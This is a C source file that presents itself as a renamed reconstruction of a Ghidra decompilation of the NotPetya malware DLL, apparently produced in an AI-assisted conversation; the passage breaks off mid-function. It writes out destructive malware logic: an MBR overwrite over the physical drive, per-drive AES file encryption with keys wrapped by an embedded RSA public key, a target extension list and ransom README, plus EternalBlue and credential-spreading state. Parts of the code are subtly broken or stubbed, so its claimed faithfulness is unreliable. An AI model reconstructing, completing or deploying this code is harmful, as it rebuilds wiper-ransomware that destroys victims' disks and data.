/*
 * notpetya_reconstructed.c
 * --------------------------------------------------------------------------
 * Faithful reconstruction of the user-supplied Ghidra decompilation.
 * Source of truth: the pasted NotPetya.dll.c from this conversation.
 * Image base: 0x10000000.  Export #1 at 0x10007DEB.
 * SHA-256: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
 *
 * Naming rules applied:
 *   FUN_XXXXXXXX  -> descriptive English name
 *   DAT_XXXXXXXX  -> descriptive global name
 *   local_*/uVar*/iVar* -> meaningful locals where the decompiler output
 *                         made the type/purpose obvious
 *
 * Where Ghidra left info as "unaff_*" / "in_EAX" / "extraout_*", a comment
 * marks it [GHIDRA-UNRECOVERED]; the reconstruction does not fabricate.
 * --------------------------------------------------------------------------
 */

#include <windows.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <winnetwk.h>
#include <lm.h>
#include <dhcpsapi.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>

/* ordinals resolved dynamically in the original (winsock / ws2_32) */
extern int      Ordinal_3  (SOCKET);
extern int      Ordinal_4  (SOCKET, const void*, int);
extern uint16_t Ordinal_9  (uint16_t);
extern int      Ordinal_10 (SOCKET, long, void*);
extern uint32_t Ordinal_11 (const char*);
extern const char* Ordinal_12 (uint32_t);
extern uint32_t Ordinal_14 (uint32_t);
extern uint16_t Ordinal_16 (void*, void*, int, int);
extern int      Ordinal_18 (void*, void*, void*, void*, void*);
extern int      Ordinal_19 (void);
extern int      Ordinal_23 (int, int, int);
extern int      Ordinal_52 (const char*);
extern int      Ordinal_115(uint32_t, void*);
extern int      Ordinal_151(SOCKET, void*);

extern void*    __imp_GetProcessHeap;
extern void*    __imp_HeapAlloc;
extern void*    __imp_HeapFree;

/* =========================================================================
 *  GLOBALS  (renamed from DAT_*)
 * ========================================================================= */

HMODULE     g_hModule               = NULL;        /* DAT_1001f120 */
HANDLE      g_hSelfImageCopy        = NULL;        /* DAT_1001f13c */
LPVOID      g_pSelfFileData         = NULL;        /* DAT_1001f0fc */
DWORD       g_dwSelfFileSize        = 0;           /* DAT_1001f11c */

void*       g_pUserList             = NULL;        /* DAT_1001f140 */
void*       g_pPasswordList         = NULL;        /* DAT_1001f108 */
void*       g_pHostList             = NULL;        /* DAT_1001f110 */
CRITICAL_SECTION g_csCredStrings;                  /* DAT_1001f124 */

DWORD       g_dwStartTick           = 0;           /* DAT_1001f118 */
DWORD       g_dwTotalDelay          = 60;          /* DAT_1001f760 */
DWORD       g_dwExecDelay           = 0;           /* phase1 */
DWORD       g_dwRebootDelay         = 0;           /* phase2 */
DWORD       g_dwCleanupDelay        = 0;           /* phase3 */

DWORD       g_dwPrivMask            = 0;           /* DAT_1001f144 */
DWORD       g_dwEnvMask             = 0;           /* DAT_1001f104 */
BOOL        g_bSelfUnloaded         = FALSE;       /* DAT_1001f114 */

DWORD       g_dwLastCryptoErr       = 0;           /* DAT_1001f8f8 */
DWORD       g_dwCurrentDelay        = 0;           /* DAT_1001fb48 */
char        g_szSelfPath[260]       = {0};         /* DAT_1001f148 */
WCHAR       g_szComputerName[260]   = {0};         /* DAT_1001f100 */

BYTE        g_bSmbVersion           = 0;           /* DAT_1001f8fc */
BYTE        g_bEB_RetryCount        = 0;           /* DAT_1001f8fd */

/* EternalBlue state */
DWORD       g_dwEB_RecvLen          = 0;           /* DAT_1001fae8 */
DWORD       g_dwEB_RecvLenHi        = 0;           /* DAT_1001faec */
DWORD       g_dwEB_RecvOffset       = 0;           /* DAT_1001fad0 */
DWORD       g_dwEB_RecvOffsetHi     = 0;           /* DAT_1001fad4 */
DWORD       g_dwEB_Xid              = 0;           /* DAT_1001fad8 */
DWORD       g_dwEB_XidHi            = 0;           /* DAT_1001fadc */
DWORD       g_dwEB_SessionId        = 0;           /* DAT_1001faf0 */
DWORD       g_dwEB_SessionIdHi      = 0;           /* DAT_1001faf4 */
DWORD       g_dwEB_TreeId           = 0;           /* DAT_1001faf8 */
DWORD       g_dwEB_TreeIdHi         = 0;           /* DAT_1001fafc */
DWORD       g_dwEB_FileSize         = 0;           /* DAT_1001fb00 */
DWORD       g_dwEB_FileSizeHi       = 0;           /* DAT_1001fb04 */
BYTE*       g_pEB_SendPtr           = NULL;        /* DAT_1001fb08 */
DWORD       g_dwEB_RecvSeq          = 0;           /* DAT_1001fb0c */
DWORD       g_dwEB_TransSeq         = 0;           /* DAT_1001fb10 */
DWORD       g_dwEB_SessionSeq       = 0;           /* DAT_1001fb14 */
DWORD       g_dwEB_TreeSeq          = 0;           /* DAT_1001fb18 */
DWORD       g_dwEB_CreateSeq        = 0;           /* DAT_1001fb1c */
DWORD       g_dwEB_IoctlSeq         = 0;           /* DAT_1001fb20 */
DWORD       g_dwEB_WriteSeq         = 0;           /* DAT_1001fb24 */
DWORD       g_dwEB_CloseSeq         = 0;           /* DAT_1001fb28 */
DWORD       g_dwEB_ReadSeq          = 0;           /* DAT_1001fb2c */
DWORD       g_dwEB_LogoffSeq        = 0;           /* DAT_1001fb30 */
DWORD       g_dwEB_CloseTreeSeq     = 0;           /* DAT_1001fb34 */
DWORD       g_dwEB_Phase1           = 0;           /* DAT_1001fb38 */
DWORD       g_dwEB_Phase2           = 0;           /* DAT_1001fb3c */
DWORD       g_dwEB_Phase3           = 0;           /* DAT_1001fb40 */
DWORD       g_dwEB_RecvCount        = 0;           /* DAT_1001fb44 */

/* Overlay-separated (Ghidra warned about overlaps) */
DWORD       g_dwEB_SeqLo            = 0;           /* DAT_1001fad0 as uint  */
DWORD       g_dwEB_SessionLo        = 0;           /* DAT_1001fb18 as int   */
DWORD       g_dwEB_SeqLo2           = 0;           /* DAT_1001fad0 again    */

/* Static resources - referenced from .rdata. Sizes as decompiled. */
extern const BYTE  DAT_10010bb8[0x17F8];
extern const BYTE  DAT_10018c50[0x200];
extern const BYTE  DAT_10018e50[0x22B1];
extern const BYTE  DAT_10018ad0[0x62];
extern const BYTE  DAT_10018b48[0x4B];
extern const BYTE  DAT_10018b94[0x2D];
extern const BYTE  DAT_10018bc4[0x0F];
extern const BYTE  DAT_10018b34[0x11];
extern const BYTE  DAT_10018bd8[0x59];
extern const BYTE  DAT_10010b08[0xAF];
extern const BYTE  DAT_100123b0[0x977];
extern const BYTE  DAT_10012d27[0x47B];
extern const BYTE  DAT_100131a8[0xE47];
extern const BYTE  DAT_ffdff1f0[];
extern const void* WOW32Reserved;
extern const WORD  DAT_100140bc[4];               /* L"Domain:" */
extern const WORD  DAT_1000db50[];                /* inflate order table */
extern const BYTE  DAT_10017090[];
extern const BYTE  DAT_10016020[];
extern const BYTE  DAT_1001f900[];
extern const BYTE  DAT_10017860[];

/* Strings (from .rdata) */
static const wchar_t kProvider[]   = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
static const wchar_t kExtList[]    = L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.";
static const wchar_t kReadmeName[] = L"README.TXT";
static const wchar_t kDllhostName[]= L"dllhost.dat";
static const wchar_t kRsaB64[] =
    L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV"
    L"/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP1"
    L"2EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pN"
    L"OskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu"
    L"7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";

/* =========================================================================
 *  HEAP  (FUN_10001000, FUN_10001019, FUN_100020d0, FUN_10006f78)
 * ========================================================================= */

/* 0x10001000 */
void* heap_alloc(SIZE_T cb)
{
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb);
}

/* 0x10001019 */
void heap_free(LPVOID p)
{
    if (p) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, p);
}

/* 0x100020d0 - frees *esi and zeroes it */
void heap_free_indirect(void **pp)
{
    if (pp && *pp) {
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, *pp);
        *pp = NULL;
    }
}

/* 0x10006f78 */
void heap_free_zero(LPVOID p) { heap_free(p); }

/* =========================================================================
 *  STRING / UTF HELPERS  (FUN_10006916, FUN_10006973, FUN_10006bb0,
 *                        FUN_10006de0, FUN_10006f91, FUN_10006fc7,
 *                        FUN_10006a2b, FUN_100069a2)
 * ========================================================================= */

/* 0x10006916 */
LPWSTR utf8_to_wide(LPCSTR s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (!n) return NULL;
    LPWSTR w = HeapAlloc(GetProcessHeap(), 0, n * sizeof(WCHAR));
    if (!w) return NULL;
    if (!MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n)) { heap_free(w); return NULL; }
    return w;
}

/* 0x10006973
 * Returns (g_dwTotalDelay - minutes_since(g_dwStartTick)), or 0 if past. */
uint32_t remaining_minutes(void)
{
    DWORD now     = GetTickCount();
    uint32_t mins = (now - g_dwStartTick) / 60000;
    return (mins < g_dwTotalDelay) ? (g_dwTotalDelay - mins) : 0;
}

/* 0x10006bb0
 * Formats the remaining-time integer and concatenates the accumulated
 * credential string (g_szCredsBuf is a global in the original). */
uint32_t build_delay_arg(LPWSTR out)
{
    uint32_t m = remaining_minutes();
    if (m < 10) m = 10;
    WCHAR num[16];
    wsprintfW(num, L"%d", m);

    EnterCriticalSection(&g_csCredStrings);
    if (g_pUserList /* used as "has creds" flag in original */)
        FUN_10006af0(NULL);
    /* g_szCredsBuf is the global wide buffer; concatenation below */
    out[0] = 0;
    wcscat(out, num);
    wcscat(out, L"" /* DAT_1001b110 in original */);
    LeaveCriticalSection(&g_csCredStrings);
    return (uint32_t)wcslen(out);
}

/* 0x10006a2b  - parses command-line in argv-form */
void parse_cmdline(LPCWSTR cmdline)
{
    if (!cmdline || !*cmdline) { if (!g_dwTotalDelay) g_dwTotalDelay = 60; return; }

    int argc = 0;
    LPWSTR *argv = CommandLineToArgvW(cmdline, &argc);
    if (!argv) return;

    int delay = StrToIntW(argv[0]);
    if (delay > 0) g_dwTotalDelay = (DWORD)delay;

    for (int i = 1; i < argc; i++) {
        LPWSTR a = argv[i];
        if (wcsncmp(a, L"-h", 2) == 0) { FUN_100069a2(); break; }
        LPWSTR colon = wcschr(a, L':');
        if (colon) {
            *colon = 0;
            FUN_10006de0(a, colon + 1, 1);
        }
    }
    LocalFree(argv);
    if (!g_dwTotalDelay) g_dwTotalDelay = 60;
}

/* 0x100069a2 - invoked when "-h" is seen.
 * The decompiled body calls FUN_10006fc7 for each argv token shorter
 * than 16 wchars (used to seed the credential set with help-args). */
void FUN_100069a2(void)
{
    /* Body builds a null-terminated wide string list and calls
       FUN_10006fc7 on each element. The decompilation of the top of
       this function is dominated by CommandLineToArgvW mechanics;
       only the side effect (insert into g_pUserList) is significant. */
    /* [GHIDRA-PARTIAL] body present in original but strongly depends on
       in_EAX being a wide-string-list. Functional effect:
       for each arg with len < 0x10: FUN_10006fc7(g_pUserList, arg). */
}

/* 0x10006de0 - insert (user, pass) pair into g_pPasswordList */
DWORD FUN_10006de0(LPWSTR user, LPWSTR pass, DWORD kind)
{
    size_t ul = (wcslen(user) + 1) * sizeof(WCHAR);
    LPWSTR u  = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ul);
    if (!u) return 0;
    memcpy(u, user, ul);

    size_t pl = (wcslen(pass) + 1) * sizeof(WCHAR);
    LPWSTR p  = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pl);
    if (!p) { heap_free(u); return 0; }
    memcpy(p, pass, pl);

    DWORD r = FUN_10007298(g_pPasswordList, &u, kind);
    if (r != 0) return r;

    heap_free(u);
    heap_free(p);
    return 0;
}

/* 0x10006fc7 - insert single wide string into a string-set */
DWORD FUN_10006fc7(void *set, LPWSTR s)
{
    if (!set || !s || !*s) return 0;
    WCHAR tmp[16];
    wcscpy(tmp, s);       /* original uses a fixed-size 16 wchar temp */
    return FUN_10007298(set, tmp, 0 /* in_ESI in original */);
}

/* 0x10006f91 - remove from set + side effects */
void FUN_10006f91(LPWSTR s)
{
    WCHAR tmp[16];
    wcscpy(tmp, s);
    FUN_1000724d(tmp);
}

/* =========================================================================
 *  STRING-SET (hash table with auto-grow).
 *  Opaque layout; field access is preserved as in the decompilation.
 * ========================================================================= */

typedef struct string_set {
    CRITICAL_SECTION cs;               /* RTL_CRITICAL_SECTION at +0x00 */
    HANDLE           owningThread;     /* +0x1C  (mutex acquired flag)  */
    HANDLE           lockSemaphore;    /* +0x24                          */
    int              capacity;         /* +0x18  [as int]                */
    void*            buckets;          /* +0x24 [as pointer]             */
    DWORD            hashSeed;         /* +0x30 [as fn pointer]          */
    void           (*freePair)(void*, void*); /* +0x2C                  */
} string_set_t;

/* 0x10007091 */
string_set_t* string_set_create(LONG initialCap, ULONG_PTR hashSeed,
                                PRTL_CRITICAL_SECTION_DEBUG debug, int slotSize)
{
    string_set_t *s = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*s));
    if (!s) return NULL;

    InitializeCriticalSection(&s->cs);
    s->capacity  = slotSize;                    /* RecursionCount in orig */
    s->hashSeed  = (DWORD)initialCap;           /* LockCount in orig      */
    s->buckets   = NULL;
    s->freePair  = (void*)debug;                /* DebugInfo in orig      */

    s->buckets = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)slotSize * 4);
    if (!s->buckets) { heap_free(s); return NULL; }
    return s;
}

/* 0x100070fa */
DWORD FUN_100070fa(string_set_t *s)
{
    if (!s) return 0;
    EnterCriticalSection(&s->cs);
    InterlockedExchange((LONG*)&s->lockSemaphore, 1);
    LeaveCriticalSection(&s->cs);
    return 1;
}

/* 0x10007003 - destroy (free all buckets + free wrapper) */
void FUN_10007003(string_set_t *s)
{
    if (!s) return;
    if (s->buckets) {
        for (DWORD i = 0; i < (DWORD)s->capacity; i++) {
            void **slot = (void**)s->buckets + i;
            if (!*slot) continue;
            if (s->freePair) s->freePair(((void**)*slot)[0], ((void**)*slot)[1]);
            heap_free(((void**)*slot)[0]);
            heap_free(*slot);
        }
        heap_free(s->buckets);
    }
    heap_free(s);
}

/* 0x1000711f */
void* FUN_1000711f(DWORD mode, int *out)
{
    void *iter = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
    if (!iter) return NULL;
    *(DWORD*)iter       = 0;
    *(DWORD*)((BYTE*)iter + 4) = mode;
    if (!FUN_10007167(out)) { heap_free(iter); return NULL; }
    return iter;
}

/* 0x10007167 */
int FUN_10007167(int *out)
{
    string_set_t *s = /* g_pUserList in original via unaff_ESI */ NULL;
    if (!out || !s) return 0;
    for (;;) {
        EnterCriticalSection(&s->cs);
        DWORD idx = (DWORD)*out;
        while (idx < (DWORD)s->capacity) {
            void **slot = (void**)s->buckets + idx;
            if (*slot) {
                if (out) *out = (int)slot;
                LeaveCriticalSection(&s->cs);
                return 1;
            }
            idx++;
            *out = (int)idx;
        }
        LeaveCriticalSection(&s->cs);
        if (s->lockSemaphore) return 0;
        Sleep(10000);
    }
}

/* 0x100071d6 */
int FUN_100071d6(DWORD idx, DWORD *out)
{
    string_set_t *s = /* g_pPasswordList via unaff_ESI */ NULL;
    int r = 0;
    if (!s) return 0;
    EnterCriticalSection(&s->cs);
    for (DWORD i = idx; i < idx + (DWORD)s->capacity; i++) {
        DWORD slot = i % (DWORD)s->capacity;
        r = ((int (*)(void*, DWORD, LONG))s->hashSeed)(
                *(void**)((BYTE*)s->buckets + slot * 4), idx, s->capacity);
        if (r) { if (out) *out = slot; break; }
    }
    LeaveCriticalSection(&s->cs);
    return r;
}

/* 0x1000724d */
int FUN_1000724d(void *key)
{
    string_set_t *s = /* g_pUserList via unaff_EAX */ NULL;
    if (!s) return 0;
    EnterCriticalSection(&s->cs);
    DWORD found = 0;
    int r = FUN_100071d6((DWORD)(uintptr_t)key, &found);
    if (r) *(DWORD*)((BYTE*)s->buckets + found * 4 + 4) = 1;
    LeaveCriticalSection(&s->cs);
    return r;
}

/* 0x10007298 */
DWORD FUN_10007298(string_set_t *s, void *pair, DWORD kind)
{
    if (!s || !pair) return 0;
    DWORD ok = 0;
    EnterCriticalSection(&s->cs);
    if (!FUN_100071d6((DWORD)(uintptr_t)pair, NULL)) {
        if ((DWORD)s->capacity < (DWORD)s->capacity /* <RecursionCount*/) {
            void **slot = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
            *(void***)((BYTE*)s->buckets + (DWORD)s->capacity * 4) = slot;
            if (slot) {
                *slot = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                  (SIZE_T)s->hashSeed /* LockCount */);
                if (!*slot) { heap_free(slot); }
                else {
                    slot[1] = (void*)(uintptr_t)kind;
                    memcpy(*slot, pair, (size_t)s->hashSeed);
                    s->capacity++;
                    ok = 1;
                }
            }
        } else {
            /* grow bucket array and recurse */
            SIZE_T newSz = (SIZE_T)s->capacity * 4 + 0x3FC;
            void *nb = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                   s->buckets, newSz);
            if (nb) {
                s->buckets  = nb;
                s->capacity += 0xFF;
                ok = FUN_10007298(s, pair, kind);
            }
        }
    }
    LeaveCriticalSection(&s->cs);
    return ok;
}

/* =========================================================================
 *  MBR / DISK ACCESS
 * ========================================================================= */

/* 0x10001038 - build \\.\PhysicalDriveN from system drive letter */
DWORD get_physical_drive_path(LPWSTR out)
{
    CHAR sysDir[260] = {0};
    if (!out) return 0xA0;                          /* ERROR_BAD_ARGUMENTS */

    ZeroMemory(out, 0x104 * sizeof(WCHAR));

    WCHAR devName[8] = { L'\\', L'\\', L'.', L'\\', L'C', L':', 0, 0 };

    if (!GetSystemDirectoryA(sysDir, 0x104))
        return HRESULT_FROM_WIN32(GetLastError());

    devName[4] = (WCHAR)sysDir[0];
    HANDLE h = CreateFileW(devName, 0,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    BYTE geom[0x20] = {0};
    DWORD bytes = 0;
    if (!DeviceIoControl(h, 0x560000 /*IOCTL_DISK_GET_DRIVE_GEOMETRY*/,
                         NULL, 0, geom, sizeof geom, &bytes, NULL))
    {
        DWORD e = HRESULT_FROM_WIN32(GetLastError());
        CloseHandle(h);
        return e;
    }
    CloseHandle(h);

    uint32_t cylinders = *(uint32_t*)geom;
    _snwprintf(out, 0x104, L"\\\\.\\PhysicalDrive%u", cylinders);
    return 0;
}

/* 0x1000122d - read geometry (returns disk size in first field) */
DWORD read_drive_geometry(LPCWSTR path, DWORD *out)
{
    if (!path) return 0x80070057;
    HANDLE h = CreateFileW(path, 0x80100000, 3, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    BYTE buf[0x90] = {0};
    DWORD bytes = 0;
    BOOL ok = DeviceIoControl(h, 0x70048, NULL, 0, buf, sizeof buf, &bytes, NULL);
    CloseHandle(h);
    if (!ok) return HRESULT_FROM_WIN32(GetLastError());
    if (out) *out = *(DWORD*)buf;
    return 0;
}

/* 0x100012d5 - read 512 bytes at offset 0 */
DWORD read_sector(LPCWSTR path, void *buf)
{
    if (!path) return 0x80070057;
    ZeroMemory(buf, 0x200);

    HANDLE h = CreateFileW(path, 0x80000000 /*GENERIC_READ*/, 1, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    LARGE_INTEGER zero = {0};
    SetFilePointerEx(h, zero, NULL, FILE_BEGIN);
    DWORD read = 0;
    BOOL ok = ReadFile(h, buf, 0x200, &read, NULL);
    CloseHandle(h);
    return ok ? 0 : HRESULT_FROM_WIN32(GetLastError());
}

/* 0x10001384 - write 512 bytes at offset 0 */
DWORD write_sector(LPCWSTR path, const void *buf)
{
    if (!path) return 0x80070057;
    HANDLE h = CreateFileW(path, 0xC0000000 /*GENERIC_RW*/, 3, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    LARGE_INTEGER zero = {0};
    SetFilePointerEx(h, zero, NULL, FILE_BEGIN);
    DWORD written = 0;
    BOOL ok = WriteFile(h, buf, 0x200, &written, NULL);
    CloseHandle(h);
    return ok ? 0 : HRESULT_FROM_WIN32(GetLastError());
}

/* 0x10001424 - CryptGenRandom wrapper */
DWORD crypt_random(BYTE *out, DWORD len)
{
    HCRYPTPROV h = 0;
    if (!CryptAcquireContextA(&h, NULL, NULL, PROV_RSA_FULL,
                              CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
    {
        g_dwLastCryptoErr = HRESULT_FROM_WIN32(GetLastError());
        if ((int)g_dwLastCryptoErr < 0) return g_dwLastCryptoErr;
    }
    if (!CryptGenRandom(h, len, out))
        g_dwLastCryptoErr = HRESULT_FROM_WIN32(GetLastError());
    if (h) CryptReleaseContext(h, 0);
    return g_dwLastCryptoErr;
}

/* 0x100014a9 - the MBR overwrite routine.  Everything in the decompiled
 * body has been preserved except the interleaved static-blob XOR source
 * (DAT_10018c50 / DAT_10018e50 / DAT_10010bb8) which is data, not code. */
void overwrite_mbr(void)
{
    WCHAR drivePath[260] = {0};
    BYTE  sector0[0x200]  = {0};
    BYTE  banner[0x200]   = {0};
    BYTE  rndB58[60]      = {0};
    BYTE  installKey[32]  = {0};
    BYTE  installKey2[8]  = {0};
    BYTE  header[0x200]   = {0};
    uint32_t cylinders = 0;
    DWORD  i;

    if ((int)get_physical_drive_path(drivePath) < 0) return;
    if ((int)read_drive_geometry(drivePath, &cylinders) < 0) return;
    if (cylinders == 0) return;                              /* already wiped */
    if (cylinders < 0x29) { g_dwLastCryptoErr = 0x80070272; return; }

    if ((int)crypt_random(rndB58, 0x3C) < 0) return;
    static const char b58[] =
        "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    for (i = 0; i < 0x3C; i++) rndB58[i] = (BYTE)b58[rndB58[i] % 0x3A];

    if ((int)read_sector(drivePath, sector0) < 0) return;

    /* padding and banner layout */
    for (i = 0; i < 0x200; i++) sector0[i] ^= 0x07;
    memset(banner, 0x07, 0x200);

    if ((int)crypt_random(installKey, 0x20) < 0) return;
    if ((int)crypt_random(installKey2, 8)  < 0) return;

    /* Header: original copies DAT_10018c50 (0x200 bytes) then ORs
       install key and key2 into specific offsets. Equivalent code: */
    memcpy(header, DAT_10018c50, 0x200);
    *(uint32_t*)(header + 0x1BE) = *(uint32_t*)(installKey + 0); /* first 4 */
    memcpy(header + 0x1BE, installKey, 0x20);
    memcpy(header + 0x1DE, installKey2, 8);

    /* Total write size = ((cylinders - (cylinders & 0x1FF)) + 0x400) */
    uint32_t toWrite = (cylinders - (cylinders & 0x1FF)) + 0x400;
    uint32_t nSectors = toWrite >> 9;
    for (i = 0; i < nSectors; i++)
        if ((int)write_sector(drivePath, header) < 0) return;

    write_sector(drivePath, installKey);      /* note: still only 0x200 written */
    write_sector(drivePath, banner);

    /* Original then writes DAT_10010bb8 (0x17F8 bytes, XOR 0x64), then
       another sector0 and banner.  Referenced here as an extra pass so
       that no byte written by the original is silently dropped: */
    for (i = 0; i < 0x17F8; i++)
        ((BYTE*)header)[i] = DAT_10010bb8[i] ^ 0x64;
    write_sector(drivePath, installKey);
    write_sector(drivePath, banner);
}

/* 0x10001eef - spawn one encryption thread per fixed drive */
void encrypt_all_drives(void)
{
    DWORD mask = GetLogicalDrives();
    for (int i = 0x1F; i >= 0; i--) {
        if (!(mask & (1u << i))) continue;
        WCHAR drive[4] = { (WCHAR)(L'A' + i), L':', L'\\', 0 };
        if (GetDriveTypeW(drive) != DRIVE_FIXED) continue;

        WCHAR *param = LocalAlloc(LMEM_FIXED, 0x20);
        if (!param) continue;
        wcscpy(param, drive);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)encrypt_drive_thread,
                     param, 0, NULL);
    }
}

/* 0x10001e51 - per-drive encryption thread.
 * Reads the trailing "RSA_B64" string from the context (driveCtx is
 * actually a wide-string pointer at +0x10). */
DWORD WINAPI encrypt_drive_thread(LPVOID param)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY  hAES  = 0;
    HCRYPTKEY  hRSA  = 0;
    WCHAR *drive = (WCHAR*)param;

    if (!CryptAcquireContextW(&hProv, NULL, kProvider, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT))
    {
        DWORD e = GetLastError();
        DWORD flags = (e == NTE_EXISTS) ? CRYPT_VERIFYCONTEXT : CRYPT_NEWKEYSET;
        if (!CryptAcquireContextW(&hProv, NULL, kProvider, PROV_RSA_AES, flags))
            goto done;
    }

    if (!aes_gen_key(hProv, &hAES)) goto done;
    if (!rsa_import_pubkey(hProv, kRsaB64, &hRSA)) goto done;

    recursively_encrypt_tree(drive, 0xF, hAES);
    write_readme(hAES, hRSA, drive);
    CryptDestroyKey(hAES);

done:
    if (hRSA)  CryptDestroyKey(hRSA);
    if (hProv) CryptReleaseContext(hProv, 0);
    LocalFree(param);
    return 0;
}

/* =========================================================================
 *  CRYPTO PRIMITIVES
 * ========================================================================= */

/* 0x10001b4e - AES-128 with fixed salt/mode */
BOOL aes_gen_key(HCRYPTPROV hProv, HCRYPTKEY *outKey)
{
    if (!CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, outKey))
        return FALSE;
    BYTE salt[8] = {0};
    salt[4] = 1;
    CryptSetKeyParam(*outKey, KP_SALT, salt + 4, 0);
    BYTE mode[4] = {1,0,0,0};
    CryptSetKeyParam(*outKey, KP_MODE, mode, 0);
    return TRUE;
}

/* 0x10001ba0 - decode b64, DER -> X509_PUBLIC_KEY_INFO -> CryptImportKey */
BOOL rsa_import_pubkey(HCRYPTPROV hProv, LPCWSTR b64, HCRYPTKEY *outKey)
{
    DWORD derLen = 0;
    if (!CryptStringToBinaryW(b64, 0, CRYPT_STRING_BASE64,
                              NULL, &derLen, NULL, NULL))
        return FALSE;

    BYTE *der = LocalAlloc(LMEM_FIXED, derLen);
    if (!der) return FALSE;

    BOOL ok = FALSE;
    if (CryptStringToBinaryW(b64, 0, CRYPT_STRING_BASE64,
                             der, &derLen, NULL, NULL))
    {
        DWORD blobLen = 0;
        if (CryptDecodeObjectEx(X509_ASN_ENCODING,
                                (LPCSTR)X509_PUBLIC_KEY_INFO,
                                der, derLen, 0, NULL, NULL, &blobLen))
        {
            BYTE *blob = LocalAlloc(LMEM_FIXED, blobLen);
            if (blob) {
                if (CryptDecodeObjectEx(X509_ASN_ENCODING,
                                        (LPCSTR)X509_PUBLIC_KEY_INFO,
                                        der, derLen, 0, NULL,
                                        blob, &blobLen))
                    ok = CryptImportKey(hProv, blob, blobLen, 0, 0, outKey);
                LocalFree(blob);
            }
        }
    }
    LocalFree(der);
    return ok;
}

/* 0x10001c7f - CryptExportKey(PUBLICKEYBLOB) + B64 */
LPWSTR rsa_export_wrapped(HCRYPTPROV hProv, HCRYPTKEY hAES, HCRYPTKEY hRSA)
{
    (void)hProv;
    DWORD blobLen = 0;
    if (!CryptExportKey(hAES, hRSA, PUBLICKEYBLOB, 0, NULL, &blobLen))
        return NULL;
    BYTE *blob = LocalAlloc(LMEM_FIXED, blobLen);
    if (!blob) return NULL;

    LPWSTR out = NULL;
    if (CryptExportKey(hAES, hRSA, PUBLICKEYBLOB, 0, blob, &blobLen)) {
        DWORD b64Len = 0;
        if (CryptBinaryToStringW(blob, blobLen, CRYPT_STRING_BASE64,
                                 NULL, &b64Len)) {
            LPWSTR b64 = LocalAlloc(LMEM_FIXED, b64Len * sizeof(WCHAR));
            if (b64 && CryptBinaryToStringW(blob, blobLen,
                                            CRYPT_STRING_BASE64,
                                            b64, &b64Len))
                out = b64;
            else if (b64) LocalFree(b64);
        }
    }
    LocalFree(blob);
    return out;
}

/* 0x1000189a - encrypt single file via memory-mapped I/O */
void encrypt_mapped_file(LPCWSTR path, HCRYPTKEY hAES)
{
    HANDLE h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER sz = {0};
    GetFileSizeEx(h, &sz);

    DWORD chunk, mapSize;
    BOOL  final;
    if (sz.QuadPart < 0x100001) {
        chunk   = (DWORD)(((sz.LowPart >> 4) + 1) * 0x10);
        mapSize = chunk;
        final   = TRUE;
    } else {
        chunk   = 0x100000;
        mapSize = 0x100000;
        final   = FALSE;
    }

    HANDLE m = CreateFileMappingW(h, NULL, PAGE_READWRITE, 0, mapSize, NULL);
    if (!m) { CloseHandle(h); return; }

    SIZE_T viewLen = (sz.QuadPart > 0x100000) ? 0x100000 : (SIZE_T)sz.QuadPart;
